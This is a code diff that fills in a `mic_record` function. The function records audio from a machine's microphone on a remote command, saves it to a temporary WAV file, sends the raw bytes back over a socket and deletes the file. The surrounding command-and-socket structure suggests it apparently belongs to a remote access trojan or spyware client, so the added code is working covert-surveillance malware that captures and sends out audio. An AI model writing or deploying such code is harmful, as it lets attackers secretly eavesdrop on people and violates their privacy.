@@ -1043,5 +1043,33 @@ def mic_record(socket, command):
             socket_send(socket, "Error: Duration must be positive")
             return False
 
+        with tempfile.NamedTemporaryFile(suffix=".wav", delete=False) as tmpfile:
+            temp_filename = tmpfile.name
+
+        try:
+            fs = 44100
+            channels = 2
+
+            recording = sd.rec(
+                int(duration * fs), samplerate=fs, channels=channels, dtype="int16"
+            )
+            sd.wait()
+
+            write(temp_filename, fs, recording)
+            with open(temp_filename, "rb") as f:
+                audio_data = f.read()
+
+            socket_send(socket, audio_data)
+            return True
+
+        except Exception as e:
+            socket_send(socket, f"Recording Error: {str(e)}")
+            return False
+        finally:
+            try:
+                os.unlink(temp_filename)
+            except:
+                pass
+
     except:
         pass
